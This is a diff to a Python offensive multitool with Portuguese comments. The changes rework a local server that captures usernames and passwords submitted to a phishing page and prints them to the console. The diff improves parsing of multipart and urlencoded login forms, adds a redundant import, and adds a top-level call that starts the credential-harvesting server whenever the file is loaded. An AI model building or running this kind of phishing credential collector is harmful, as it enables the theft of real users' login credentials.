@@ -10,6 +10,7 @@ import requests
 import urllib.parse as urlparse
 from email.parser import BytesParser
 from email import policy
+import email.policy
 from io import BytesIO
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
@@ -330,23 +331,27 @@ def run_local_server(target_url, language):
 
             print("Received POST data:", post_data.decode('utf-8'))  # Para depuração
 
+            username = ''
+            password = ''
+
             if content_type.startswith('multipart/form-data'):
                 # Processar dados multipart/form-data
-                boundary = content_type.split('boundary=')[1].encode()
-                parts = post_data.split(boundary)
+                boundary = content_type.split("boundary=")[1]
+                parts = post_data.split(boundary.encode())
+
                 for part in parts:
                     if b'Content-Disposition' in part:
-                        headers, body = part.split(b'\r\n\r\n', 1)
-                        headers = headers.decode()
-                        if 'name="username"' in headers:
-                            username = body.split(b'\r\n')[0].decode()
-                        elif 'name="password"' in headers:
-                            password = body.split(b'\r\n')[0].decode()
+                        disposition = part.split(b'\r\n')[1].decode()
+                        if 'name="username"' in disposition:
+                            username = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0].decode('utf-8')
+                        elif 'name="password"' in disposition:
+                            password = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0].decode('utf-8')
+
             else:
                 # Processar dados application/x-www-form-urlencoded
                 post_data = post_data.decode('utf-8')
                 post_params = urlparse.parse_qs(post_data)
-                username = post_params.get('username', [''])[0]
+                username = post_params.get('login', [''])[0]
                 password = post_params.get('password', [''])[0]
 
             # Exibir credenciais no console
@@ -387,6 +392,9 @@ def run_local_server(target_url, language):
 
     except Exception as e:
         print(f"Error running local server: {e}")
+
+# Exemplo de uso da função run_local_server
+run_local_server("http://www.example.com", '2')
 
 # Função para informações de número de telefone
 def phone_number_info(language):
